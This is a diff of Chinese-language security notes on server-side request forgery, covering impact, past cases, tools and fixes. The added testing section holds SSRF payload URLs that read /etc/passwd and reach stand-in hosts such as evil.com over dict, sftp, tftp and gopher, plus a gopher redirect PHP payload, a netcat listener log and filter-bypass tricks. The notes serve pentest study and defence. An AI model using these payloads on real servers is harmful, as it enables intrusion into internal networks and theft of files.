@@ -22,11 +22,6 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
 * 从指定URL地址获取资源(下载、分享、url跳转)
   * 资源存在形式:图片.png、图标.ico、网页.html、文本.txt
 
-　　
-
-　　
-  
-  
 ### 漏洞影响
 
 * 内网
@@ -36,9 +31,8 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
   * 攻击内网其他主机
     * web漏洞(SQLi,XSS...)
   * 读取文件
-    * 类型1 支持了file协议读取文件
+    * 类型1 支持了URL Schema(file等协议)
       * 实例 `/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml` [21CN某站SSRF(可读取本地数据库配置文件、探测内网)](https://www.secpulse.com/archives/29452.html)
-      * 解析
     * 类型2
       * ImageMagick CVE-2016-3718
       * discuz x2.5/x3.0/x3.1/x3.2 SSRF漏洞
@@ -50,10 +44,37 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
 
 [SSRF Tips](http://blog.safebuff.com/2016/07/03/SSRF-Tips/) `SSRF PHP function` `SFTP Dict gopher TFTP file ldap`
 
+### 测试方法
+
+* URL Schema
+  * `file://` `http://example.com/ssrf.php?url=file:///etc/passwd`
+  * `dict://` `http://example.com/ssrf.php?dict://evil.com:1337/`
+  * `sftp://` `http://example.com/ssrf.php?url=sftp://evil.com:1337/`
+  * `ldap://` 轻量级目录访问协议
+    * `http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`
+    * `http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`
+    * `http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`
+  * `tftp://` TFTP（Trivial File Transfer Protocol,简单文件传输协议
+    * `http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
+  * `gopher://` Gopher是一种分布式文档传递服务
+    * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
+
+gopher.php (host it on acttacker.com):
+```
+<?php
+  header('Location: gopher://evil.com:1337/_Hi%0Assrf');
+?>
+```
+同时监听到信息
+```
+evil.com:# nc -lvp 1337
+Hi
+ssrf
+```
 
 ### 利用方式
   
-绕过方式 
+绕过技巧
   * 使用@绕过不严谨的过滤 `a.com@10.10.10.10` `a.com:b@10.10.10.10`
   * IP地址变形 - 进制转换 `127.0.0.1 => 2130706433`
   * 域名解析 `10.100.21.7 => http://10.100.21.7.xip.io 或 http://www.10.100.21.7.xip.name`[有道翻译SSRF修复不完整再通内网](https://www.secpulse.com/archives/50153.html)
@@ -70,7 +91,6 @@ SSRF测试工具/利用工具
 |[samhaxr/XXRF-Shots](https://github.com/samhaxr/XXRF-Shots)|node.js|生成payload 发送众多请求 并使用phantomJS实现网页截图|
 |[swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)|python3|Automatic SSRF fuzzer and exploitation(RCE...) tool|
 |[tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)|python2|生成gopher link 以利用SSRF实现RCE. This tool generates gopher link for exploiting SSRF and gaining RCE in various servers |
-
 
 ### 修复方式
 
